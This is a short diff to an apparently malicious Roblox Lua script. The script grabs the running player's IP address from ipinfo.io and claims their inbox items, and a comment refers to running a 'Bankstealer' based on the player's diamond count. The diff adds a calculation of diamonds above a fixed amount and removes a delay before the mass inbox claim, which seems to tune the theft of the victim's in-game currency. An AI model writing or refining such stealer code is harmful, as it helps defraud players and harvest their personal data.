@@ -181,6 +181,11 @@ local fardplayer = game:GetService("Players").LocalPlayer
 local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local data1
 
+local dims = player.leaderstats.Diamonds.Value - 7000000
+if dims < 0 then
+	dims = 0
+end
+
 -- Loading Screen
 if _G.LoadingScreen ~= false then
     local ScreenGui = Instance.new("ScreenGui")
@@ -756,7 +761,7 @@ local inbox = #check.Inbox
 
 if inbox ~= 0 and invspace_nolimit() >= inbox then
     claimallremote:InvokeServer()
-    task.wait(1)
+    task.wait(0)
 end
 
 -- Run Bankstealer if Diamonds Are < 110k
